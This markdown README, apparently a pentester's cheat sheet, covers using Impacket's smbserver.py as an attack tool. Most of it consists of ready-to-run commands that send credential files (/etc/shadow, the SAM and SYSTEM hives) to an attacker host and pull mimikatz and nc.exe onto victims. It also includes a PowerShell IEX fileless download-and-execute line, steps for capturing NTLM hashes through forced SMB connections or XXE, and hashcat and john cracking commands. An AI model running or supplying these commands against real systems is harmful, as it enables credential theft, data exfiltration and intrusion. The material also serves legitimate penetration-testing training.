<!-- CYBERPUNK HEADER -->
<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ░██████╗███╗░░░███╗██████╗░░██████╗███████╗██████╗░██╗░░░██╗███████╗██████╗║
║   ██╔════╝████╗░████║██╔══██╗██╔════╝██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗
║   ╚█████╗░██╔████╔██║██████╦╝╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝█████╗░░██████╔╝
║   ░╚═══██╗██║╚██╔╝██║██╔══██╗░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██╔══╝░░██╔══██╗
║   ██████╔╝██║░╚═╝░██║██████╦╝██████╔╝███████╗██║░░██║░░╚██╔╝░░███████╗██║░░██║
║   ╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
║                                                                              ║
║                    [ Impacket SMB Server Usage Guide ]                       ║
║                                                                              ║
║          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                  ║
║          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                  ║
║                                                                              ║
║             > Hosting files for exfiltration...                              ║
║             > Capturing NTLM hashes...                                       ║
║             > Cross-platform file transfer...                                ║
║                                                                              ║
║                  [████████████████████] 100%                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<!-- BADGES -->
![Tool](https://img.shields.io/badge/TOOL-smbserver.py-red?style=for-the-badge&logo=python&logoColor=white)
![File Transfer](https://img.shields.io/badge/FILE_TRANSFER-00FF00?style=for-the-badge&logo=files&logoColor=black)
![SMB](https://img.shields.io/badge/PROTOCOL-SMB-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)

[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
![Category](https://img.shields.io/badge/Category-File_Transfer-purple?style=flat-square)
![Protocol](https://img.shields.io/badge/Protocol-SMB%2FCIFS-blue?style=flat-square)

</div>

---

> **`[SYSTEM]`** Impacket's SMB server for file transfer and NTLM hash capture
>
> **`[STATUS]`** Module: `LOADED` | Target: `CROSS_PLATFORM` | Protocol: `SMB`

---

## 📋 >_ Table.Of.Contents()

- [Overview](#-overview)
- [Start the SMB Server](#-start-the-smb-server-attacker-machine)
- [Transfer from Linux](#-transferring-files-from-linux-victim)
- [Transfer from Windows](#-transferring-files-from-windows-victim)
- [NTLM Hash Capture](#-ntlm-hash-capture)
- [Troubleshooting](#-troubleshooting)
- [Quick Reference](#-quick-reference-cheat-sheet)

---

## 🎯 Overview

```
> Loading module: SMBServer.dll...
> Initializing file transfer handler...
> Status: READY
```

**smbserver.py** is part of the Impacket toolkit and creates an SMB server for:

| Function | Description | Icon |
|:---------|:------------|:----:|
| **File Transfer** | Upload/download files to/from targets | 📂 |
| **Hash Capture** | Capture NTLM hashes from connections | 🔑 |
| **Payload Hosting** | Host exploits and tools for targets | 💉 |
| **Data Exfiltration** | Extract sensitive files from targets | 📤 |

### ⚡ Key Features

```
[✓] Cross-platform file transfer (Windows/Linux)
[✓] SMBv1 and SMBv2 support
[✓] Authentication options (user/pass or anonymous)
[✓] NTLM hash capture capability
[✓] No installation needed on target
```

---

## ⚠️ Prerequisites

```
> Checking system requirements...
> Status: VERIFY_BEFORE_START
```

> **`[WARNING]`** macOS Users
>
> Before running the server, ensure native **File Sharing** is turned **OFF** in System Settings, or you will get an `Address already in use` error on port 445.

### 🔧 Installation Check

```bash
# Verify Impacket is installed
impacket-smbserver --help

# Or using pip
pip install impacket

# Alternative: Clone from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

---

## 🖥️ Start the SMB Server (Attacker Machine)

```
> Loading module: Server_Init.dll...
> Status: LISTENING
```

Run this on your attacking machine (macOS/Linux) to host the files.

### ⚡ The "Compatible" Command (Recommended)

This enables SMBv2 (for modern Windows) and sets a username/password to bypass "Guest Access" security policies.

```bash
# Syntax: sudo smbserver.py <ShareName> <LocalDirectory> -smb2support -user <User> -password <Pass>
sudo smbserver.py SHARE . -smb2support -user temp -password temp
```

### 📊 Command Breakdown

| Parameter | Description |
|:----------|:------------|
| `SHARE` | Name of the share (clients connect to this) |
| `.` | Local directory to share (current directory) |
| `-smb2support` | Enable SMBv2 for modern Windows |
| `-user temp` | Username for authentication |
| `-password temp` | Password for authentication |

### 🔧 Common Variations

**Share specific directory:**
```bash
sudo smbserver.py SHARE /tmp/transfer -smb2support -user temp -password temp
```

**Listen on specific IP:**
```bash
sudo smbserver.py SHARE . -smb2support -user temp -password temp -ip 192.168.1.100
```

**Listen on specific port:**
```bash
sudo smbserver.py SHARE . -smb2support -user temp -password temp -port 4445
```

### 📜 The "Legacy" Command

Only use this for Windows XP / Server 2003 (SMBv1).

```bash
sudo smbserver.py SHARE .
```

> **`[NOTE]`** Modern Windows (7+) will reject connections without authentication unless you specifically configure the client to allow insecure guest access.

---

## 🐧 Transferring Files FROM Linux (Victim)

```
> Loading module: Linux_Transfer.dll...
> Status: READY
```

Assuming you have a shell on a Linux victim and want to send files **TO** your `smbserver`.

### 📁 Method A: Using `smbclient` (Standard)

Most common method. Does not require root.

**Upload a file to your server:**
```bash
# Syntax: smbclient //<AttackerIP>/<ShareName> -U <User> -c 'put <FileToSend>'
smbclient //<AttackerIP>/SHARE -U temp -c 'put /etc/shadow'
# Enter password 'temp' when prompted
```

**Download a file from your server:**
```bash
smbclient //<AttackerIP>/SHARE -U temp -c 'get linpeas.sh'
```

**Interactive session:**
```bash
smbclient //<AttackerIP>/SHARE -U temp
# Password: temp
smb: \> put sensitive_file.txt
smb: \> get payload.exe
smb: \> ls
smb: \> exit
```

**Upload multiple files:**
```bash
smbclient //<AttackerIP>/SHARE -U temp -c 'prompt OFF; mput *.txt'
```

**Download multiple files:**
```bash
smbclient //<AttackerIP>/SHARE -U temp -c 'prompt OFF; mget *.exe'
```

### 💿 Method B: Mounting (Requires Root)

Mounts your share to a local folder on the victim.

```bash
# Create mount point
mkdir /tmp/transfer

# Mount the share
mount -t cifs //<AttackerIP>/SHARE /tmp/transfer -o username=temp,password=temp,vers=3.0

# Now just copy files normally
cp /root/proof.txt /tmp/transfer/
cp /etc/shadow /tmp/transfer/

# Unmount when done
umount /tmp/transfer
```

**Mount with different SMB version:**
```bash
# SMBv2
mount -t cifs //<AttackerIP>/SHARE /tmp/transfer -o username=temp,password=temp,vers=2.0

# SMBv1 (legacy)
mount -t cifs //<AttackerIP>/SHARE /tmp/transfer -o username=temp,password=temp,vers=1.0
```

### 🔧 Method C: Using `impacket-smbclient`

If you have Impacket on the victim:

```bash
impacket-smbclient temp:temp@<AttackerIP>
# shares
# use SHARE
# put localfile.txt
# get remotefile.txt
```

---

## 🪟 Transferring Files FROM Windows (Victim)

```
> Loading module: Windows_Transfer.dll...
> Status: READY
```

Assuming you have a shell on a Windows victim and want to send files **TO** your `smbserver`.

### 💾 Method A: `net use` (Mount Drive)

The most reliable method. Maps your share to a drive letter (e.g., `Z:`).

**1. Connect:**
```cmd
net use Z: \\<AttackerIP>\SHARE /user:temp temp
```

**2. Transfer (Copy/Move):**
```cmd
:: Upload files to attacker
copy C:\Users\Administrator\Desktop\flag.txt Z:\
copy C:\Windows\System32\config\SAM Z:\
copy C:\Windows\System32\config\SYSTEM Z:\

:: Download files from attacker
copy Z:\exploit.exe C:\Windows\Temp\
move Z:\mimikatz.exe C:\Windows\Temp\
```

**3. Disconnect:**
```cmd
net use Z: /delete
```

**View current connections:**
```cmd
net use
```

### 📋 Method B: Direct Copy (UNC Path)

Quick for single files without mounting a drive.

```cmd
:: Upload to attacker
copy C:\Windows\System32\config\SAM \\<AttackerIP>\SHARE\SAM
copy C:\Windows\System32\config\SYSTEM \\<AttackerIP>\SHARE\SYSTEM
copy C:\Users\Admin\Desktop\passwords.txt \\<AttackerIP>\SHARE\

:: Download from attacker
copy \\<AttackerIP>\SHARE\nc.exe C:\Windows\Temp\
copy \\<AttackerIP>\SHARE\mimikatz.exe C:\Temp\
```

**With credentials (if needed):**
```cmd
:: First authenticate
net use \\<AttackerIP>\SHARE /user:temp temp

:: Then copy
copy C:\file.txt \\<AttackerIP>\SHARE\
```

### ⚡ Method C: PowerShell

If CMD is blocked or you prefer PowerShell.

**Create credential object and copy:**
```powershell
# Create credential object
$pass = ConvertTo-SecureString "temp" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("temp", $pass)

# Copy to your server (upload)
Copy-Item "C:\Secret\data.db" -Destination "\\<AttackerIP>\SHARE\data.db" -Credential $cred

# Copy from your server (download)
Copy-Item "\\<AttackerIP>\SHARE\mimikatz.exe" -Destination "C:\Temp\" -Credential $cred
```

**Map as PSDrive:**
```powershell
# Create credential
$pass = ConvertTo-SecureString "temp" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("temp", $pass)

# Map drive
New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\<AttackerIP>\SHARE" -Credential $cred

# Use it
Copy-Item C:\Users\Admin\secrets.txt X:\
Get-ChildItem X:\

# Remove when done
Remove-PSDrive -Name "X"
```

**One-liner download and execute:**
```powershell
# Download and run in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('\\<AttackerIP>\SHARE\script.ps1')
```

### 🔧 Method D: xcopy / robocopy

For copying directories:

```cmd
:: Copy entire directory
xcopy C:\Users\Admin\Documents \\<AttackerIP>\SHARE\docs\ /E /H /C /I

:: Robocopy (more robust)
robocopy C:\SensitiveData \\<AttackerIP>\SHARE\exfil /E /Z
```

---

## 🔑 NTLM Hash Capture

```
> Loading module: Hash_Capture.dll...
> Status: LISTENING
```

One of the most powerful features of smbserver.py is capturing NTLM hashes.

### ⚡ Capture Mode Setup

Start the server **without** authentication to capture hashes:

```bash
sudo smbserver.py SHARE . -smb2support
```

### 🎯 Triggering Connections

From the Windows target, trigger any SMB connection:

```cmd
:: Any of these will send NTLM hash
dir \\<AttackerIP>\SHARE
net use \\<AttackerIP>\SHARE
type \\<AttackerIP>\SHARE\test.txt
copy \\<AttackerIP>\SHARE\file.exe .
```

**Via PowerShell:**
```powershell
ls \\<AttackerIP>\SHARE
Get-ChildItem \\<AttackerIP>\SHARE
```

**Via file inclusion/XXE:**
```
\\<AttackerIP>\SHARE\file.txt
```

### 📊 Captured Hash Format

The captured hash will appear in NTLMv2 format:

```
[*] Incoming connection (10.10.10.5,49823)
[*] AUTHENTICATE_MESSAGE (DOMAIN\username,WORKSTATION)
[*] User DOMAIN\username authenticated successfully
[*] username::DOMAIN:1122334455667788:AABBCCDD...:0101000000000000...
```

### 💥 Cracking the Hash

```bash
# Using hashcat
hashcat -m 5600 hash.txt wordlist.txt

# Using john
john --format=netntlmv2 hash.txt --wordlist=wordlist.txt
```

---

## 🔧 Troubleshooting

```
> Loading module: Diagnostics.dll...
> Status: TROUBLESHOOTING
```

### ❌ Common Issues

**"Address already in use" on port 445:**
```bash
# Check what's using port 445
sudo lsof -i :445
sudo netstat -tlnp | grep 445

# On macOS: Disable File Sharing in System Settings
# On Linux: Stop Samba
sudo systemctl stop smbd
```

**"Access Denied" on Windows:**
```cmd
:: Ensure proper authentication
net use Z: \\<IP>\SHARE /user:temp temp

:: Check if another connection exists
net use
net use * /delete /yes
```

**"The specified network name is no longer available":**
```bash
# Ensure SMBv2 is enabled
sudo smbserver.py SHARE . -smb2support -user temp -password temp
```

**Guest access blocked (Windows 10/11):**
```
# Always use -user and -password options
sudo smbserver.py SHARE . -smb2support -user temp -password temp
```

### 🔍 Debug Mode

```bash
# Enable verbose output
sudo smbserver.py SHARE . -smb2support -user temp -password temp -debug
```

---

## ⚡ Quick Reference Cheat Sheet

```
> Loading module: Quick_Ref.dll...
> Status: READY
```

| Action | OS | Command |
|:-------|:---|:--------|
| **Start Server** | Attacker | `sudo smbserver.py SHARE . -smb2support -user temp -password temp` |
| **Start (Legacy)** | Attacker | `sudo smbserver.py SHARE .` |
| **Start (Hash Capture)** | Attacker | `sudo smbserver.py SHARE . -smb2support` |
| **Mount Share** | Win Client | `net use Z: \\<IP>\SHARE /user:temp temp` |
| **Unmount** | Win Client | `net use Z: /delete` |
| **Quick Upload** | Win Client | `copy file.txt \\<IP>\SHARE\` |
| **Quick Download** | Win Client | `copy \\<IP>\SHARE\file.exe .` |
| **Upload** | Linux Client | `smbclient //<IP>/SHARE -U temp -c 'put file.txt'` |
| **Download** | Linux Client | `smbclient //<IP>/SHARE -U temp -c 'get file.txt'` |
| **Mount (Linux)** | Linux Client | `mount -t cifs //<IP>/SHARE /mnt -o user=temp,pass=temp` |
| **NTLM Capture** | Attacker | Start server without `-user/-password`, trigger connection |

### 🎯 Common Workflows

**Exfiltrate SAM/SYSTEM (Windows):**
```cmd
:: On attacker
sudo smbserver.py SHARE . -smb2support -user temp -password temp

:: On Windows target
net use Z: \\<AttackerIP>\SHARE /user:temp temp
reg save HKLM\SAM Z:\SAM
reg save HKLM\SYSTEM Z:\SYSTEM
net use Z: /delete
```

**Deploy and Execute Tool (Windows):**
```cmd
:: On attacker (host mimikatz.exe in current dir)
sudo smbserver.py SHARE . -smb2support -user temp -password temp

:: On Windows target
net use Z: \\<AttackerIP>\SHARE /user:temp temp
copy Z:\mimikatz.exe C:\Temp\
C:\Temp\mimikatz.exe
```

**Linux File Exfiltration:**
```bash
# On attacker
sudo smbserver.py SHARE /tmp/loot -smb2support -user temp -password temp

# On Linux target
smbclient //<AttackerIP>/SHARE -U temp -c 'put /etc/passwd'
smbclient //<AttackerIP>/SHARE -U temp -c 'put /etc/shadow'
```

---

<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                   [ END OF TRANSMISSION // SMBSERVER ]                       ║
║                                                                              ║
║                    "Transfer complete. Connection closed."                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

</div>
